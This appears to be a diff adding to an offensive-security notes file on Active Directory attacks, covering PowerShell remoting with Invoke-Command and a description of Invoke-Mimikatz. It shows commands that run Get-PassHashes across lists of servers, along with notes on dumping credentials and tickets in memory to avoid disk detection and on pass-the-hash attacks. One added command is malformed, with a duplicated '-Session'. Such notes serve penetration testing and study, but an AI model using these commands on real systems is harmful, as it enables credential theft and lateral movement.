@@ -336,3 +336,12 @@ println "out> $sout err> $err"
   - `Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList`
 - In below, a functional call within the script is used:
   - `Invoke-Command -Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)` 
+- Use below to execute "Stateful" commands using Invoke-Command
+  - `$Sess = New-PSSession -ComputerName Server1`
+  - `Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}`
+  - `Invoke-Command -Session -Session $Sess -ScriptBlock {$Proc.Name}`
+- More Informations
+  - The script could be used to dump credentials, tickets and more using mimikatz with PowerShell without dropping the mimikatz exe to disk.
+  - It is very useful for passing and replaying hashes, tickets and for many exciting Active Directory Attacks.
+  - Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this scipt.
+  - The script needs administrative privileges for dumping credentials from local machines. May attacks need specific privileges which are covered while discussing that attack.
